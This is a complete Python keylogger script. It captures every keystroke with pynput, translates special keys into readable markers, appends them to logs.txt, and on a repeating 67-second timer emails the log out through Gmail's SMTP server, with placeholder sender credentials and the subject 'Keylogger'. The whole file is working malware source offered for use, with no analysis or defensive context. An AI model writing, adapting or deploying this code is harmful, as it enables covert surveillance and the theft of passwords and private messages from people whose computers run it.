#!/usr/bin/python3.7 
#coding:utf-8

from os import system
from pynput.keyboard import Listener
import threading
import smtplib
from email.mime.multipart import *
from email.mime.text import *

def write_to_file(key):
	
	letter=str(key)
	letter=letter.replace("'", "")
	
	if letter == "Key.space":
		letter = ' '
	if letter == "Key.shift":
		letter = '==>'
	if letter == "Key.tab":
		letter = '	'
	if letter == 'Key.enter':
		letter = "\n"
	if letter == "Key.delete":
		letter = '"del"'
	if letter == "Key.backspace":
		letter = '<=='
	if letter == "Key.alt":
		letter = '"ALT"'
	if letter == "Key.ctrl":
		letter = '^'
	if letter == "Key.right":
		letter = '"right"'
	if letter == "Key.left":
		letter = '"left"'
	if letter == "Key.up":
		letter = '"up"'
	if letter == "Key.down":
		letter = '"down"'
	if letter == "Key.page_up":
		letter = '"page.up"'
	if letter == "Key.page_down":
		letter = '"page.down"'
	print(letter)
	with open('logs.txt', 'a') as log:
		log.write(letter) 
		
	
def mail():
	
	msg = MIMEMultipart()
	msg['From'] = 'EMAIL'
	msg['To'] = 'EMAIL'
	msg['Subject'] = 'Keylogger'
	message = '      ===> Keylogger'
	filename = "logs.txt"
	msg.attach(MIMEText(open(filename).read()))
	msg.attach(MIMEText(message))
	mailserver = smtplib.SMTP('smtp.gmail.com', 587)
	mailserver.ehlo()
	mailserver.starttls()
	mailserver.ehlo()
	mailserver.login('EMAIL', 'EMAIL')
	mailserver.sendmail('EMAIL', 'EMAIL',msg.as_string())
	mailserver.quit()

	timer = threading.Timer(67,mail)
	timer.start()

with Listener(on_press=write_to_file) as l:
	mail()
	l.join()
